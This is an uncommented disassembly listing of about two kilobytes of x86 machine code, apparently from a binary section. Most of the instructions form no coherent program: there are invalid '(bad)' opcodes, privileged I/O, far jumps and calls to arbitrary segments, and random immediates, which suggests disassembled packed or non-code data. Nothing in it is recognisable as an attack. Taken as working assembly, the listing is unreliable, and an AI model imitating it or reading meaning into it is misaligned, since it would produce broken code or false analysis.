  416e2c:	out    0xc0,eax
  416e2e:	sbb    al,0x3a
  416e30:	in     al,0xca
  416e32:	push   cs
  416e33:	add    ebx,DWORD PTR [edx+0x4]
  416e36:	mov    ecx,DWORD PTR [ebp+0x60]
  416e39:	mov    bl,0x98
  416e3b:	retf   0xc7ab
  416e3e:	stos   DWORD PTR es:[edi],eax
  416e3f:	sbb    BYTE PTR [ebx],dl
  416e41:	push   edx
  416e42:	popa   
  416e43:	lods   eax,DWORD PTR ds:[esi]
  416e44:	pop    eax
  416e45:	sbb    DWORD PTR [esi],ebp
  416e47:	sbb    DWORD PTR [edi+0x4e],ebx
  416e4a:	dec    esp
  416e4b:	push   ebp
  416e4c:	popf   
  416e4d:	scas   al,BYTE PTR es:[edi]
  416e4e:	mov    esp,DWORD PTR [esi-0x55154fff]
  416e54:	push   0x46547e13
  416e59:	outs   dx,BYTE PTR ds:[esi]
  416e5a:	iret   
  416e5b:	dec    esi
  416e5c:	xlat   BYTE PTR ds:[bx]
  416e5e:	imul   BYTE PTR [eax]
  416e60:	(bad)  
  416e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e62:	dec    ecx
  416e63:	lea    ebp,[ebp-0x53755d36]
  416e69:	mov    WORD PTR [ecx],ds
  416e6b:	sub    eax,0xfd89e7ea
  416e70:	aad    0x3c
  416e72:	das    
  416e73:	test   BYTE PTR [edi+0x68],0x31
  416e77:	fild   WORD PTR [esi-0x5]
  416e7a:	ins    DWORD PTR es:[edi],dx
  416e7b:	sbb    cl,al
  416e7d:	xor    dh,BYTE PTR [ebx+0x170779a6]
  416e83:	cmp    ecx,DWORD PTR [edi-0x73]
  416e86:	or     eax,0x557f784
  416e8b:	inc    esp
  416e8c:	jg     0x416e42
  416e8e:	adc    ebx,esi
  416e90:	sbb    DWORD PTR [eax-0x1b],esp
  416e93:	xchg   edx,ebx
  416e95:	push   ds
  416e96:	add    dl,BYTE PTR [esi]
  416e98:	dec    ebx
  416e99:	cmp    ah,BYTE PTR [ecx]
  416e9b:	sbb    al,0x86
  416e9d:	inc    edx
  416e9e:	inc    esp
  416e9f:	aas    
  416ea0:	scas   eax,DWORD PTR es:[edi]
  416ea1:	in     eax,0x3b
  416ea3:	std    
  416ea4:	aas    
  416ea5:	or     BYTE PTR [ecx],dh
  416ea7:	push   esi
  416ea8:	rol    ch,0x35
  416eab:	sub    ch,BYTE PTR [edi]
  416ead:	test   BYTE PTR [ecx-0x231647f8],al
  416eb3:	into   
  416eb4:	jnp    0x416ece
  416eb6:	mov    edi,0x5881afb9
  416ebb:	loop   0x416eb5
  416ebd:	ret    0x8192
  416ec0:	jg     0x416f2f
  416ec2:	scas   al,BYTE PTR es:[edi]
  416ec3:	in     eax,dx
  416ec4:	outs   dx,DWORD PTR ds:[esi]
  416ec5:	sbb    eax,0xb0d5b562
  416eca:	jae    0x416ea0
  416ecc:	mov    bl,0x34
  416ece:	fwait
  416ecf:	xor    bl,BYTE PTR [edi]
  416ed1:	std    
  416ed2:	or     edx,DWORD PTR [edx]
  416ed4:	popf   
  416ed5:	push   ss
  416ed6:	dec    ebx
  416ed7:	(bad)  [esp+eax*4-0x28763512]
  416ede:	mov    ds:0x4632949c,al
  416ee3:	jmp    0xd1ac571b
  416ee8:	xchg   edi,eax
  416ee9:	and    BYTE PTR [edx],cl
  416eeb:	jo     0x416efa
  416eed:	lds    ebx,FWORD PTR gs:[edx-0x54]
  416ef1:	sbb    eax,0xa38a221d
  416ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef7:	inc    edx
  416ef8:	cmp    al,0x58
  416efa:	(bad)  
  416efb:	(bad)  [ebp-0x5a7fd14b]
  416f01:	call   0x1d3ad3ee
  416f06:	push   es
  416f07:	fldlg2 
  416f09:	dec    DWORD PTR [eax-0x4f37c2f6]
  416f0f:	xor    ah,BYTE PTR [eax+0x71430339]
  416f15:	inc    ebx
  416f16:	stos   BYTE PTR es:[edi],al
  416f17:	jle    0x416f75
  416f19:	mov    dh,0xa6
  416f1b:	out    0x36,al
  416f1d:	fistp  QWORD PTR [edi+0x26]
  416f20:	lods   al,BYTE PTR ds:[esi]
  416f21:	shl    BYTE PTR fs:[ebx+0x599a73cd],0xd4
  416f29:	mov    ebx,0x900497e8
  416f2e:	jmp    0x5f9aeb2f
  416f33:	cmp    al,0xfd
  416f35:	daa    
  416f36:	pop    eax
  416f37:	jecxz  0x416f12
  416f39:	std    
  416f3a:	cmp    al,0x1f
  416f3c:	imul   edi,DWORD PTR [eax],0xffffff94
  416f3f:	outs   dx,DWORD PTR ds:[esi]
  416f40:	sub    al,0x8c
  416f42:	nop
  416f43:	icebp  
  416f44:	rep outs dx,DWORD PTR ds:[esi]
  416f46:	xlat   BYTE PTR ds:[ebx]
  416f47:	jae    0x416f93
  416f49:	or     al,0xa0
  416f4b:	pusha  
  416f4c:	aam    0x7
  416f4e:	mov    ecx,0x1d39a7f5
  416f53:	push   eax
  416f54:	out    0xc6,al
  416f56:	test   ah,dl
  416f58:	mov    ah,0x59
  416f5a:	fist   DWORD PTR [esi-0x1141f49c]
  416f60:	ret    0x9a51
  416f63:	jmp    0x76c7:0xfc825c11
  416f6a:	mov    edi,0x5f63ef97
  416f6f:	inc    esp
  416f70:	and    edx,ebp
  416f72:	inc    eax
  416f73:	xchg   BYTE PTR [esi-0x5d],al
  416f76:	nop
  416f77:	(bad)  
  416f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f79:	and    BYTE PTR [edx-0x14],bh
  416f7c:	in     eax,dx
  416f7d:	mov    edi,0x906d90bf
  416f82:	and    dl,bl
  416f84:	and    ebp,DWORD PTR [ebx-0x18d21d4b]
  416f8a:	int3   
  416f8b:	push   ds
  416f8c:	inc    ebx
  416f8d:	call   0x4101:0xb98e0f19
  416f94:	or     ebp,DWORD PTR [eax+0x2e376af9]
  416f9a:	test   dl,0xb6
  416f9d:	dec    DWORD PTR [edi]
  416f9f:	test   ebp,esi
  416fa1:	lock ja 0x416f4d
  416fa4:	je     0x417018
  416fa6:	xchg   edx,eax
  416fa7:	xchg   BYTE PTR [edi],ah
  416fa9:	std    
  416faa:	cli    
  416fab:	setnp  dl
  416fae:	ins    DWORD PTR es:[edi],dx
  416faf:	jge    0x416fc8
  416fb1:	pushf  
  416fb2:	popa   
  416fb3:	xchg   esp,eax
  416fb4:	mov    edi,0xa13e9dc7
  416fb9:	data16 adc BYTE PTR [eax+eax*1],0xb3
  416fbe:	sub    eax,0xa36a6bd6
  416fc3:	imul   esi,DWORD PTR [ecx],0x5a472fb2
  416fc9:	hlt    
  416fca:	pop    ds
  416fcb:	fist   WORD PTR [edi]
  416fcd:	jl     0x416ff4
  416fcf:	retfw  0xc730
  416fd3:	push   ss
  416fd4:	jnp    0x416fbf
  416fd6:	test   BYTE PTR [ecx],bl
  416fd8:	mov    ebx,0xe71ac0bd
  416fdd:	aad    0x61
  416fdf:	adc    BYTE PTR [ecx+edi*1+0x33],0x3c
  416fe4:	jecxz  0x416f8b
  416fe6:	jl     0x417009
  416fe8:	jae    0x416fef
  416fea:	call   0x1fc21a4c
  416fef:	loop   0x417057
  416ff1:	pop    ds
  416ff2:	(bad)  
  416ff4:	in     eax,dx
  416ff5:	mov    ch,0x6
  416ff7:	icebp  
  416ff8:	dec    edi
  416ff9:	(bad)  
  416ffa:	clc    
  416ffb:	fidiv  WORD PTR [ebp+0x72]
  416ffe:	aaa    
  416fff:	mov    ecx,0x8aa257ef
  417004:	mov    bl,0x7b
  417006:	popa   
  417007:	mov    cl,0x67
  417009:	lods   al,BYTE PTR ds:[esi]
  41700a:	sbb    BYTE PTR [edx+0x1a8e2a33],al
  417010:	push   cs
  417011:	adc    cl,BYTE PTR [ebp+0x569d096e]
  417017:	mov    ah,0x14
  417019:	jns    0x417094
  41701b:	cwde   
  41701c:	fidivr DWORD PTR [ebp+0x4de8359f]
  417022:	arpl   WORD PTR [eax],cx
  417024:	sub    DWORD PTR ds:0x648ddf4c,ebp
  41702a:	shl    DWORD PTR [esi],1
  41702c:	loope  0x417098
  41702e:	aaa    
  41702f:	aam    0x2c
  417031:	shl    DWORD PTR [ebx],1
  417033:	push   eax
  417034:	xlat   BYTE PTR ds:[ebx]
  417035:	xor    ebx,DWORD PTR [eax-0x92770c1]
  41703b:	adc    edx,DWORD PTR [edi-0x38ef4475]
  417041:	mov    bh,0xb3
  417043:	sbb    eax,0xabb74887
  417048:	inc    eax
  417049:	xchg   ecx,eax
  41704a:	dec    eax
  41704b:	ss call 0xfd:0x1a94e78d
  417053:	fwait
  417054:	and    BYTE PTR [ecx-0x96f8138],al
  41705a:	mov    bl,0xc4
  41705c:	call   0xbcb2ec2f
  417061:	jbe    0x417095
  417063:	scas   eax,DWORD PTR es:[edi]
  417064:	sub    BYTE PTR [esi+0x37],dh
  417067:	pop    edx
  417068:	je     0x41704d
  41706a:	pop    esi
  41706b:	scas   eax,DWORD PTR es:[edi]
  41706c:	hlt    
  41706d:	mov    bl,0x9f
  41706f:	inc    ecx
  417070:	cwde   
  417071:	rol    BYTE PTR [edi-0x67],cl
  417074:	mov    eax,0x920e826
  417079:	pop    es
  41707a:	int3   
  41707b:	popf   
  41707c:	popa   
  41707d:	xor    bl,BYTE PTR [ebx]
  41707f:	adc    al,0xa0
  417081:	rcr    DWORD PTR [eax+0x50],cl
  417084:	jecxz  0x41702a
  417086:	or     al,0xe8
  417088:	pop    ecx
  417089:	std    
  41708a:	aam    0xae
  41708c:	mov    ds:0xa8ccb4b7,al
  417091:	jge    0x417102
  417093:	push   esp
  417094:	mov    ecx,0xa252aab2
  417099:	xchg   esp,eax
  41709a:	cmp    eax,0x6f8abf92
  41709f:	mov    ecx,0xdbfc9e10
  4170a4:	ret    0x61db
  4170a7:	mov    ?,esi
  4170a9:	cmp    esp,DWORD PTR [edx]
  4170ab:	int    0xce
  4170ad:	mov    ebp,0xf52b1bc2
  4170b2:	pop    ds
  4170b3:	enter  0xa0cc,0x52
  4170b7:	adc    al,0x1a
  4170b9:	jae    0x4170e6
  4170bb:	das    
  4170bc:	xor    DWORD PTR [ecx],edx
  4170be:	das    
  4170bf:	adc    ebx,DWORD PTR [ebx+0x47]
  4170c2:	adc    DWORD PTR [ebp-0xc771229],esp
  4170c8:	pop    es
  4170c9:	cmp    dh,BYTE PTR [ebp+0x47]
  4170cc:	add    BYTE PTR [esi-0x4f2cd8f5],bh
  4170d2:	or     DWORD PTR [esi],ebx
  4170d4:	adc    bl,BYTE PTR [eax+0x213beba9]
  4170da:	mov    eax,0xe2500f97
  4170df:	push   ebp
  4170e0:	or     eax,0x48d19a63
  4170e5:	push   esi
  4170e6:	rcr    BYTE PTR [ebp-0x1b518bf6],cl
  4170ec:	push   esp
  4170ed:	jo     0x417167
  4170ef:	mov    ebx,0x6377f8b2
  4170f4:	mov    esp,edx
  4170f6:	out    dx,al
  4170f7:	push   es
  4170f8:	dec    edx
  4170f9:	mov    bh,0x2a
  4170fb:	add    al,0x7a
  4170fd:	stos   BYTE PTR es:[edi],al
  4170fe:	push   cs
  4170ff:	push   eax
  417100:	rcr    al,1
  417102:	xor    DWORD PTR [esp+ecx*1-0xec39e95],edi
  417109:	xchg   edi,eax
  41710a:	es nop
  41710c:	adc    bl,ch
  41710e:	adc    al,0x1d
  417110:	imul   esi,DWORD PTR [eax-0x35bdc1af],0x62
  417117:	fadd   st,st(3)
  417119:	ret    
  41711a:	pop    ds
  41711b:	outs   dx,DWORD PTR ds:[esi]
  41711c:	(bad)  
  41711d:	sub    DWORD PTR [edx],esp
  41711f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417120:	clc    
  417121:	mov    al,0x9c
  417123:	test   DWORD PTR [esi+0x24],edx
  417126:	in     eax,0xeb
  417128:	ja     0x4170d3
  41712a:	add    bl,BYTE PTR [ecx]
  41712c:	and    BYTE PTR [edx+0x58],ah
  41712f:	fldenv [edx+ebx*2-0x2]
  417133:	and    eax,0xf5f3286e
  417138:	jg     0x4170ec
  41713a:	dec    ebp
  41713b:	aaa    
  41713c:	pop    edi
  41713d:	mov    dl,0x21
  41713f:	jae    0x417118
  417141:	pusha  
  417142:	sub    eax,0x93530a94
  417147:	pop    edi
  417148:	push   eax
  417149:	les    ebx,FWORD PTR [edi+ebp*1+0x35]
  41714d:	int3   
  41714e:	jae    0x417156
  417150:	out    dx,eax
  417151:	ins    BYTE PTR es:[edi],dx
  417152:	hlt    
  417153:	stos   BYTE PTR es:[edi],al
  417154:	mov    esi,DWORD PTR [ebx-0x69]
  417157:	lea    edx,[eax]
  417159:	out    dx,al
  41715a:	and    cl,BYTE PTR ds:0xccac6f3b
  417160:	repnz ror DWORD PTR ds:0xaa202188,1
  417167:	mov    ah,0x9b
  417169:	lods   eax,DWORD PTR ds:[esi]
  41716a:	adc    DWORD PTR [edx+0x67],edx
  41716d:	repnz imul ebp,DWORD PTR [esp+eiz*4+0x5c],0x7f
  417173:	shl    DWORD PTR [edx-0x66],1
  417176:	xchg   edx,eax
  417177:	cmp    cl,BYTE PTR [ecx+0x30]
  41717a:	adc    eax,0x83278b8c
  41717f:	mov    ch,0x29
  417181:	mov    dh,0x47
  417183:	sti    
  417184:	(bad)  
  417185:	ret    0x168b
  417188:	call   DWORD PTR ds:0x7451b9f7
  41718e:	adc    eax,0x425bde03
  417193:	nop
  417194:	inc    ecx
  417195:	sub    eax,0xc4efd0cf
  41719a:	add    eax,0x64180ef9
  41719f:	(bad)  
  4171a0:	popa   
  4171a1:	jbe    0x417209
  4171a3:	sub    edi,DWORD PTR [ebx]
  4171a5:	push   ebx
  4171a6:	push   ebx
  4171a7:	mov    ebp,0x1771f09e
  4171ac:	push   ebp
  4171ad:	call   0xbc40:0x1b4e5172
  4171b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b5:	xchg   ebx,eax
  4171b6:	push   edi
  4171b7:	push   cs
  4171b8:	sbb    ch,BYTE PTR [ebp-0x11]
  4171bb:	jle    0x4171de
  4171bd:	mov    BYTE PTR [ebp+0x482ffc2e],al
  4171c3:	popa   
  4171c4:	retf   
  4171c5:	stos   BYTE PTR es:[edi],al
  4171c6:	xor    ebx,DWORD PTR [edx+0x50]
  4171c9:	fcom   DWORD PTR [eax-0x38c4d5e9]
  4171cf:	pop    eax
  4171d0:	cwde   
  4171d1:	dec    esp
  4171d2:	je     0x41723e
  4171d4:	jns    0x417234
  4171d6:	mov    ds:0x9589afe0,al
  4171db:	push   es
  4171dc:	shl    BYTE PTR [ecx],cl
  4171de:	xchg   ebp,eax
  4171df:	mov    ch,0x92
  4171e1:	aas    
  4171e2:	cmp    esp,ecx
  4171e4:	ret    
  4171e5:	jp     0x417257
  4171e7:	retf   
  4171e8:	and    al,0x3f
  4171ea:	retf   0x9b1f
  4171ed:	sub    al,0xaf
  4171ef:	iret   
  4171f0:	daa    
  4171f1:	cmp    cl,BYTE PTR [ebp+0x51aeeda5]
  4171f7:	stos   DWORD PTR es:[edi],eax
  4171f8:	in     al,0x83
  4171fa:	ja     0x41722b
  4171fc:	dec    esp
  4171fd:	xor    eax,0x709a72fd
  417202:	xchg   esi,eax
  417203:	mov    esi,0x969cb150
  417208:	mov    BYTE PTR [eax+0x40d7e5ef],dl
  41720e:	retf   0x8806
  417211:	ss mov dl,0xda
  417214:	mov    ebp,0xa616956b
  417219:	cs jne 0x4171d5
  41721c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41721d:	mov    cl,0xe0
  41721f:	shl    dl,cl
  417221:	sbb    BYTE PTR [eax+0x26],bh
  417224:	repz (bad) [eax+0x6e]
  417228:	enter  0xdbe8,0x96
  41722c:	popf   
  41722d:	je     0x417292
  41722f:	pusha  
  417230:	pop    ebp
  417231:	mov    ecx,0x4cfd2d28
  417236:	cdq    
  417237:	push   0x5
  417239:	inc    ecx
  41723a:	div    DWORD PTR [ecx-0x48]
  41723d:	pop    ebx
  41723e:	es inc ecx
  417240:	lds    ebx,FWORD PTR [ecx+eiz*1]
  417243:	or     al,0xc6
  417245:	jmp    0x4171fc
  417247:	sub    ebx,DWORD PTR [edx+0x36]
  41724a:	retf   
  41724b:	push   ss
  41724c:	jnp    0x417204
  41724e:	or     ah,ch
  417250:	mov    ch,0x22
  417252:	call   0x5795:0x4fc47112
  417259:	out    dx,eax
  41725a:	cli    
  41725b:	inc    ebp
  41725c:	push   edx
  41725d:	sti    
  41725e:	sbb    DWORD PTR [edi-0xc],esp
  417261:	mov    eax,0xb2f059ae
  417266:	in     al,dx
  417267:	jo     0x41728c
  417269:	pop    ebp
  41726a:	mov    cl,0x6f
  41726c:	pop    edi
  41726d:	daa    
  41726e:	dec    edi
  417270:	ss hlt 
  417272:	jo     0x417252
  417274:	mov    edi,0x2638fd4a
  417279:	jnp    0x41720c
  41727b:	cld    
  41727c:	arpl   WORD PTR [esi],si
  41727e:	addr16 push es
  417280:	std    
  417281:	lods   al,BYTE PTR ds:[esi]
  417282:	mov    al,0x87
  417284:	pop    ebp
  417285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417286:	jl     0x41722a
  417288:	mov    al,ds:0x4a4728b4
  41728d:	or     dl,BYTE PTR [ecx]
  41728f:	adc    DWORD PTR [ecx+0x470d0a31],ebx
  417295:	out    0x3f,al
  417297:	cwde   
  417298:	sub    eax,0x4b3229a
  41729d:	popa   
  41729e:	cmp    DWORD PTR [edi+edi*2],0x3b45db4f
  4172a5:	lds    eax,FWORD PTR ds:0x8980dcfc
  4172ab:	cld    
  4172ac:	adc    eax,DWORD PTR [ebx+0x5f63dd25]
  4172b2:	add    ebp,DWORD PTR ds:0x7c92c070
  4172b8:	mov    cl,0x7
  4172ba:	fidivr DWORD PTR [eax+0x53]
  4172bd:	call   0xefcdf59e
  4172c2:	dec    esp
  4172c3:	aad    0x33
  4172c5:	adc    BYTE PTR ds:0x2f2a0e15,ch
  4172cb:	push   esp
  4172cc:	(bad)
  4172cf:	push   edi
  4172d0:	mov    eax,ds:0x8f13eef3
  4172d5:	sbb    al,0xf2
  4172d7:	ins    DWORD PTR es:[edi],dx
  4172d8:	test   al,0x5d
  4172da:	mov    al,ds:0x1cc7a47c
  4172df:	ret    
  4172e0:	mov    esi,0xc6c98dc
  4172e5:	jae    0x417288
  4172e7:	popa   
  4172e8:	mov    ebp,0xe463a4a2
  4172ed:	ret    0xfe38
  4172f0:	mov    al,0x5b
  4172f2:	or     BYTE PTR [bx+0x16f6],al
  4172f7:	rcl    BYTE PTR [ecx],cl
  4172f9:	jns    0x417290
  4172fb:	mov    eax,0x5bcb66a0
  417300:	hlt    
  417301:	gs aam 0xa1
  417304:	push   edx
  417305:	and    dl,BYTE PTR [esi-0x75]
  417308:	sub    al,dh
  41730a:	mov    al,ds:0x8458362e
  41730f:	in     al,dx
  417310:	fnstcw WORD PTR [edx+0x2de4e241]
  417316:	inc    edx
  417317:	sbb    ch,bh
  417319:	cmovg  edx,DWORD PTR [edi]
  41731c:	leave  
  41731d:	push   ebx
  41731e:	cmc    
  41731f:	push   esi
  417320:	das    
  417321:	push   0x54ba8ee4
  417326:	outs   dx,BYTE PTR ds:[esi]
  417327:	mov    bl,0x1b
  417329:	mov    ebx,0x3e9a2829
  41732e:	rcl    dh,0x21
  417331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417332:	jl     0x41734e
  417334:	xchg   ebx,eax
  417335:	add    al,0xf4
  417337:	std    
  417338:	cld    
  417339:	shl    ch,1
  41733b:	outs   dx,BYTE PTR ds:[esi]
  41733c:	xchg   ecx,eax
  41733d:	ffreep st(5)
  41733f:	daa    
  417340:	jbe    0x417317
  417342:	xchg   edi,eax
  417343:	sbb    esp,0xffffff82
  417346:	dec    edx
  417347:	gs call 0xc9a3:0x6ebf88b5
  41734f:	out    0xcc,eax
  417351:	sbb    ch,bl
  417353:	mov    eax,0x71cd0f52
  417359:	lods   al,BYTE PTR ds:[esi]
  41735a:	cmp    eax,0x97db7548
  41735f:	pop    ss
  417360:	data16 mov WORD PTR [ebx-0x1384be5],fs
  417367:	dec    edi
  417368:	inc    eax
  417369:	loopne 0x417341
  41736b:	in     al,0xe4
  41736d:	jecxz  0x41734f
  41736f:	or     cl,dl
  417371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417372:	jne    0x417313
  417374:	gs test eax,0x91f251b4
  41737a:	leave  
  41737b:	or     DWORD PTR [ecx],ebx
  41737d:	repz mov ebp,DWORD PTR [eax-0xe]
  417381:	retf   0x76f2
  417384:	(bad)  
  417385:	rcl    BYTE PTR [ecx-0x3a],1
  417388:	aas    
  417389:	xchg   edi,eax
  41738a:	xchg   ebp,eax
  41738b:	jo     0x4173fc
  41738d:	mov    eax,ds:0xfebe8f87
  417392:	aam    0x70
  417394:	adc    DWORD PTR [esp+edx*8-0x62],esi
  417398:	push   DWORD PTR [ebp+0x29]
  41739b:	stc    
  41739c:	push   ebp
  41739d:	mov    al,0x6e
  41739f:	cmp    al,0x4b
  4173a1:	mov    al,ds:0x8899ec9
  4173a6:	shr    BYTE PTR [ebx-0x49],cl
  4173a9:	mov    eax,ds:0x2dc22993
  4173ae:	xor    BYTE PTR [eax],dl
  4173b0:	test   al,0x77
  4173b2:	mov    ebx,0xe38d3b8f
  4173b7:	add    ecx,edi
  4173b9:	pop    ebp
  4173ba:	in     eax,0x82
  4173bc:	sub    al,0x37
  4173be:	push   cs
  4173bf:	(bad)  
  4173c0:	imul   eax,DWORD PTR [esi-0x17673a83],0xffffffca
  4173c7:	mov    dh,0x7f
  4173c9:	int3   
  4173ca:	jae    0x41734e
  4173cc:	ret    0x3cac
  4173cf:	mov    esi,0x5de42756
  4173d4:	xchg   esp,eax
  4173d5:	fidiv  WORD PTR [edx+ecx*4]
  4173d8:	push   0x1a
  4173da:	push   esp
  4173db:	jmp    DWORD PTR [ecx+0x23]
  4173de:	iret   
  4173df:	rcl    BYTE PTR [ebx],cl
  4173e1:	adc    BYTE PTR [ebx+0x48],0x79
  4173e5:	into   
  4173e6:	mov    edx,0x92eb31a9
  4173eb:	sub    esp,eax
  4173ed:	mov    ds:0x7d3eeae7,eax
  4173f2:	or     eax,0x615e40ab
  4173f7:	aad    0x7d
  4173f9:	(bad)  
  4173fa:	in     al,0x9
  4173fc:	jb     0x417392
  4173fe:	stos   DWORD PTR es:[edi],eax
  4173ff:	xchg   ebp,eax
  417400:	shl    BYTE PTR [ecx],cl
  417402:	jnp    0x417477
  417404:	pop    edi
  417405:	fadd   st,st(2)
  417407:	loopne 0x417405
  417409:	iret   
  41740a:	dec    ebp
  41740b:	mov    ebx,0x5b044973
  417410:	out    0xda,al
  417412:	jae    0x417428
  417414:	js     0x417406
  417416:	xor    eax,0x5f38e4ab
  41741b:	mov    ch,0xdd
  41741d:	addr16 popf 
  41741f:	dec    ecx
  417420:	xor    esi,0x3a
  417423:	sbb    eax,0xc089e49a
  417428:	in     al,0x2f
  41742a:	xchg   edx,eax
  41742b:	cld    
  41742c:	fcomp  DWORD PTR [ebx+ebx*1+0x64ee8d55]
  417433:	repnz inc ecx
  417435:	add    al,0x78
  417437:	lahf   
  417438:	mov    BYTE PTR [esp],cl
  41743b:	mov    al,0xb9
  41743d:	inc    edx
  41743e:	dec    esi
  41743f:	jl     0x41743c
  417441:	mov    WORD PTR [ecx+0x6e],ds
  417444:	nop
  417445:	jo     0x41740c
  417447:	in     al,0xd8
  417449:	jp     0x41747e
  41744b:	rol    DWORD PTR ds:0xef76edf4,cl
  417451:	inc    ecx
  417452:	or     al,BYTE PTR [ebp+0xd]
  417455:	sahf   
  417456:	int    0x34
  417458:	call   0x89dce7ca
  41745d:	out    dx,al
  41745e:	mov    cl,0x4b
  417460:	sbb    ecx,DWORD PTR [edi]
  417462:	jl     0x417442
  417464:	hlt    
  417465:	pop    eax
  417466:	jbe    0x4174de
  417468:	and    eax,0x11df65e9
  41746d:	cld    
  41746e:	ret    
  41746f:	jle    0x4174dc
  417471:	and    al,0x7
  417473:	xchg   esi,eax
  417474:	ins    BYTE PTR es:[edi],dx
  417475:	popa   
  417476:	in     al,dx
  417477:	cmc    
  417478:	test   eax,0xe7708cf2
  41747d:	jmp    0xb519:0x3e4b9b1c
  417484:	lds    esi,FWORD PTR [ecx]
  417486:	pushf  
  417487:	pop    edx
  417488:	xlat   BYTE PTR ds:[ebx]
  417489:	mov    al,bl
  41748b:	xor    BYTE PTR [ebx+0x3fbbedaf],dh
  417491:	in     al,0x16
  417493:	pop    eax
  417494:	or     DWORD PTR [eax],ebx
  417496:	fimul  WORD PTR [edx-0x5b864f25]
  41749c:	push   es
  41749d:	dec    ebx
  41749e:	pop    esp
  41749f:	jns    0x41745d
  4174a1:	test   eax,0x85009be3
  4174a6:	repz int 0x33
  4174a9:	jne    0x4174f5
  4174ab:	das    
  4174ac:	nop
  4174ad:	mov    ecx,0xd36d7863
  4174b2:	jo     0x417444
  4174b4:	retf   0xea73
  4174b7:	icebp  
  4174b8:	sbb    al,0x7a
  4174ba:	sub    esp,edi
  4174bc:	dec    esi
  4174bd:	test   eax,0x463bf387
  4174c2:	sbb    dl,bh
  4174c4:	jbe    0x4174ef
  4174c6:	inc    ebp
  4174c7:	push   esp
  4174c8:	mov    fs,edi
  4174ca:	inc    ebp
  4174cb:	test   BYTE PTR [edi-0x49],dl
  4174ce:	or     eax,0x4494b6a5
  4174d3:	ret    0x93e6
  4174d6:	cmp    al,bh
  4174d8:	fadd   QWORD PTR [eax-0x31]
  4174db:	ss mov dh,0x82
  4174de:	push   0xf1f0a51e
  4174e3:	cs retf 
  4174e5:	ret    0xf11a
  4174e8:	lods   eax,DWORD PTR ds:[esi]
  4174e9:	cmp    eax,DWORD PTR [ecx+ecx*2]
  4174ec:	xchg   esp,eax
  4174ed:	outs   dx,BYTE PTR ds:[esi]
  4174ee:	(bad)  
  4174ef:	cld    
  4174f0:	jae    0x417539
  4174f2:	aam    0xe6
  4174f4:	in     eax,dx
  4174f5:	leave  
  4174f6:	pop    esp
  4174f7:	cmp    eax,0xda1bca42
  4174fc:	stos   DWORD PTR es:[edi],eax
  4174fd:	mov    eax,0x8512e388
  417502:	rcl    BYTE PTR [edi+eiz*4-0x38],1
  417506:	cmp    al,0xca
  417508:	pop    ebp
  417509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41750a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750b:	push   cs
  41750c:	xor    eax,0x12254128
  417511:	std    
  417512:	repnz and BYTE PTR [edi-0x9],dl
  417516:	sti    
  417517:	push   eax
  417518:	mov    esi,0xc9605a3c
  41751d:	push   ebx
  41751e:	xor    eax,ebx
  417520:	xchg   edi,eax
  417521:	pop    ss
  417522:	or     al,0xfe
  417524:	pop    ds
  417525:	stc    
  417526:	sbb    esi,DWORD PTR [bx+si-0x3c]
  41752a:	add    eax,0x7c469117
  41752f:	ins    DWORD PTR es:[edi],dx
  417530:	cdq    
  417531:	adc    eax,0x16a34085
  417536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417537:	(bad)  
  417538:	mov    eax,ds:0x54cc234b
  41753d:	ds or  ecx,DWORD PTR ss:[ebx-0x44ae7734]
  417545:	add    al,0x96
  417547:	idiv   BYTE PTR [ecx-0x3cc8e35d]
  41754d:	ins    BYTE PTR es:[edi],dx
  41754e:	sub    al,0xb3
  417550:	lahf   
  417551:	mov    esi,0xafc0a63f
  417556:	mov    cl,0x1e
  417558:	adc    ebp,ecx
  41755a:	dec    esp
  41755b:	ud0    ecx,ecx
  41755e:	es daa 
  417560:	xchg   ebx,eax
  417561:	sar    BYTE PTR [ecx],cl
  417563:	enter  0x8c7,0xbf
  417567:	mov    fs,WORD PTR [esi]
  417569:	pop    ebp
  41756a:	mov    ah,0xbc
  41756c:	data16 rcr BYTE PTR [edi],0xa8
  417570:	fstp   DWORD PTR cs:[edx-0x3]
  417574:	frstor [edi+0x6d]
  417577:	or     ebp,DWORD PTR [ebp+0x5ae9b12d]
  41757d:	js     0x417558
  41757f:	test   DWORD PTR [edi],ecx
  417581:	scas   eax,DWORD PTR es:[edi]
  417582:	arpl   WORD PTR [edi],sp
  417584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417585:	imul   eax,esp,0x31
  417588:	jmp    0x4ccd6c94
  41758d:	adc    esp,DWORD PTR [eax+edx*1]
  417590:	mov    eax,ds:0x697739bb
  417595:	ja     0x41751b
  417597:	mov    bh,0xe6
  417599:	push   esi
  41759a:	iret   
  41759b:	jle    0x41760a
  41759d:	mov    al,ds:0x29ca4cc
  4175a2:	daa    
  4175a3:	xor    DWORD PTR es:[ebx-0x1ebd0554],ecx
  4175aa:	es mov ch,0xd3
  4175ad:	in     al,dx
  4175ae:	jmp    0x11f1:0x743823da
  4175b5:	rcr    DWORD PTR [esi],cl
  4175b7:	adc    ebx,DWORD PTR [edx+edi*2-0x2b409221]
  4175be:	test   al,0x15
  4175c0:	imul   edx,DWORD PTR [edi+0x5e463546],0x247751e6
  4175ca:	jmp    0x4175c9
  4175cc:	xor    edx,esi
  4175ce:	data16 aas 
  4175d0:	mov    ds:0xc8ff02c3,al
  4175d5:	cmp    DWORD PTR [ecx],ebx
  4175d7:	loop   0x4175ee
  4175d9:	fild   DWORD PTR [edx+0x4baa4a14]
  4175df:	cld    
  4175e0:	push   0xffffffda
  4175e2:	rcr    DWORD PTR [esi],cl
  4175e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e5:	aam    0x6b
  4175e7:	mov    eax,0x2e9507ce
  4175ec:	fs jne 0x41764c
  4175ef:	xchg   BYTE PTR [edx-0x283bfe37],ah
  4175f5:	mov    edi,edx
